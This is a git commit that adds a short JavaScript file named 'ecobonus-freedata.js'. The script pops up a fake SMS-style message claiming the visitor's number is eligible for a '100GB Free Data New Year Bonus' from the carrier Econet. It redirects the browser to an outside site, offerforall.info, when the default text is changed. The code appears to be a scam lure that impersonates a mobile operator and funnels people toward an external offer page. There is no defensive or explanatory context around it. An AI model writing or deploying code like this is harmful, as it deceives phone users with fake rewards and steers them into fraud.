c5aa7cda6f8d79a649f286f755629ffb900d5bbd
harryjohnson86 <mfonjohnson86@gmail.com>
2025-01-14 01:30:14 -0800

    Create ecobonus-freedata.js

---
+++ ecobonus-freedata.js
@@ -0,0 +1,5 @@
+var password = 'Econet Bonus Free Data'
+password=prompt('SMS: Congratulations Your Number is Eligible to receive 100GB Free Data New Year Bonus REWARD, Kindly Press OK to ACTIVATE. ','Econet Bonus Free Data');
+if (password != 'Econet Bonus Free Data') {
+location.href='https://offerforall.info/ecobonus-freedata.html';
+}
